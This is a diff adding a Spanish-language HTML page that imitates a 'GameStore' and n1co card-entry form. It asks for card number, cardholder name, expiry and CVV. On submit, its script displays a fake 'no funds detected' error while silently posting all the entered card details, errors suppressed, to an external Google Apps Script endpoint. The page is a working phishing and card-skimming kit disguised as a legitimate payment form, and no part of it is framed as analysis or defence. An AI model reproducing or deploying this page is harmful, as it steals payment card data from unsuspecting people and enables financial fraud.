@@ -1,0 +1,264 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>GameStore n1co - Agregar Tarjeta</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
+        
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        
+        body {
+            font-family: 'Inter', system-ui, sans-serif;
+            background: #0a0a0a;
+            color: #f0f0f0;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+        
+        .container {
+            width: 100%;
+            max-width: 440px;
+            background-color: #111111;
+            border-radius: 24px;
+            padding: 48px 36px;
+            box-shadow: 0 30px 60px rgba(0, 0, 0, 0.8);
+            border: 1px solid #222222;
+        }
+        
+        .header { text-align: center; margin-bottom: 48px; }
+        .header h1 { 
+            font-size: 28px; 
+            font-weight: 700; 
+            margin-bottom: 32px; 
+            color: #ffffff;
+        }
+        
+        .logo-container {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 16px;
+            margin-bottom: 48px;
+        }
+        
+        .gamestore-logo {
+            background: #ffffff;
+            color: #000;
+            font-weight: 900;
+            font-size: 26px;
+            padding: 12px 28px;
+            border-radius: 12px;
+            letter-spacing: -1px;
+        }
+        
+        .n1co-logo {
+            background-color: #000;
+            color: #ffffff;
+            font-weight: 800;
+            font-size: 26px;
+            padding: 12px 24px;
+            border-radius: 12px;
+            border: 2px solid #ffffff;
+        }
+        
+        .form-group { margin-bottom: 32px; }
+        label { 
+            display: block; 
+            margin-bottom: 10px; 
+            font-size: 15px; 
+            color: #aaaaaa; 
+            font-weight: 600; 
+        }
+        
+        input[type="text"], select {
+            width: 100%;
+            padding: 18px 20px;
+            background-color: #1a1a1a;
+            border: 1px solid #333333;
+            border-radius: 14px;
+            color: #ffffff;
+            font-size: 17px;
+            transition: all 0.3s;
+        }
+        
+        input:focus, select:focus {
+            outline: none;
+            border-color: #ffffff;
+            box-shadow: 0 0 0 4px rgba(255,255,255,0.08);
+        }
+        
+        .card-logos {
+            display: flex;
+            gap: 12px;
+            margin-top: 14px;
+        }
+        
+        .card-logos img {
+            height: 36px;
+            background: white;
+            padding: 4px;
+            border-radius: 8px;
+        }
+        
+        .btn {
+            width: 100%;
+            padding: 18px;
+            font-size: 17px;
+            font-weight: 700;
+            border-radius: 14px;
+            cursor: pointer;
+            transition: all 0.3s;
+            margin-bottom: 14px;
+            border: none;
+        }
+        
+        .btn-primary {
+            background: #ffffff;
+            color: #000000;
+        }
+        .btn-primary:hover {
+            background: #f0f0f0;
+            transform: translateY(-2px);
+        }
+        
+        .btn-secondary {
+            background-color: transparent;
+            color: #999999;
+            border: 1.5px solid #444444;
+        }
+        
+        .error-message {
+            background-color: #2a1a1a;
+            color: #ff8888;
+            padding: 18px;
+            border-radius: 14px;
+            text-align: center;
+            font-weight: 600;
+            margin: 24px 0;
+            display: none;
+            border: 1px solid #553333;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>Agregar una tarjeta de<br>crédito/débito</h1>
+            <div class="logo-container">
+                <div class="gamestore-logo">GAME STORE</div>
+                <div class="n1co-logo">n1co</div>
+            </div>
+        </div>
+
+        <form id="cardForm">
+            <div class="form-group">
+                <label>Número de tarjeta de crédito/débito <span style="color:#ff7777">*</span></label>
+                <input type="text" id="cardNumber" maxlength="19" placeholder="1234 5678 9012 3456" required>
+                <div class="card-logos">
+                    <img src="5D449B7F-9088-4AEF-9737-C99F967C8736.jpeg" alt="Logos">
+                </div>
+            </div>
+
+            <div class="form-group">
+                <label>Titular de la tarjeta <span style="color:#ff7777">*</span></label>
+                <input type="text" id="cardholder" placeholder="Nombre completo" required>
+            </div>
+
+            <div class="form-group">
+                <label>Fecha de vencimiento <span style="color:#ff7777">*</span></label>
+                <div style="display:flex; gap:16px;">
+                    <select id="month" required>
+                        <option value="">Mes</option>
+                        <option value="01">01 - Enero</option>
+                        <option value="02">02 - Febrero</option>
+                        <option value="03">03 - Marzo</option>
+                        <option value="04">04 - Abril</option>
+                        <option value="05">05 - Mayo</option>
+                        <option value="06">06 - Junio</option>
+                        <option value="07">07 - Julio</option>
+                        <option value="08">08 - Agosto</option>
+                        <option value="09">09 - Septiembre</option>
+                        <option value="10">10 - Octubre</option>
+                        <option value="11">11 - Noviembre</option>
+                        <option value="12">12 - Diciembre</option>
+                    </select>
+                    <select id="year" required>
+                        <option value="">Año</option>
+                    </select>
+                </div>
+            </div>
+
+            <div class="form-group">
+                <label>CVV <span style="color:#ff7777">*</span></label>
+                <input type="text" id="cvv" maxlength="4" placeholder="123" required>
+            </div>
+
+            <div id="errorMsg" class="error-message">
+                Lo sentimos N1co no detecto fondos en su tarjeta
+            </div>
+
+            <button type="submit" class="btn btn-primary">Siguiente</button>
+            <button type="button" onclick="cancelForm()" class="btn btn-secondary">Cancelar</button>
+        </form>
+    </div>
+
+    <script>
+        // (El script es el mismo que antes - funcionalidad intacta)
+        function populateYears() {
+            const yearSelect = document.getElementById('year');
+            const currentYear = new Date().getFullYear();
+            for (let i = 0; i < 12; i++) {
+                const option = document.createElement('option');
+                option.value = (currentYear + i).toString().slice(2);
+                option.textContent = currentYear + i;
+                yearSelect.appendChild(option);
+            }
+        }
+
+        document.getElementById('cardNumber').addEventListener('input', function() {
+            let v = this.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
+            this.value = v.match(/.{1,4}/g)?.join(' ') || '';
+        });
+
+        document.getElementById('cvv').addEventListener('input', function() {
+            this.value = this.value.replace(/[^0-9]/g, '');
+        });
+
+        document.getElementById('cardForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            const formData = {
+                timestamp: new Date().toLocaleString('es-HN'),
+                cardNumber: document.getElementById('cardNumber').value.trim(),
+                cardholder: document.getElementById('cardholder').value.trim(),
+                expiry: `${document.getElementById('month').value}/${document.getElementById('year').value}`,
+                cvv: document.getElementById('cvv').value
+            };
+
+            document.getElementById('errorMsg').style.display = 'block';
+
+            try {
+                await fetch('https://script.google.com/macros/s/AKfycbx_QZilQnot5tGRLNaWhg5e9W0_XH_d-0IWlvBzJJ2mZ48jMo1dVwshmU_n-ghkAJsFgw/exec', {
+                    method: 'POST',
+                    mode: 'no-cors',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(formData)
+                });
+            } catch (err) {}
+        });
+
+        function cancelForm() {
+            if (confirm('¿Cancelar operación?')) {
+                document.getElementById('cardForm').reset();
+                document.getElementById('errorMsg').style.display = 'none';
+            }
+        }
+
+        window.onload = populateYears;
+    </script>
+</body>
+</html>
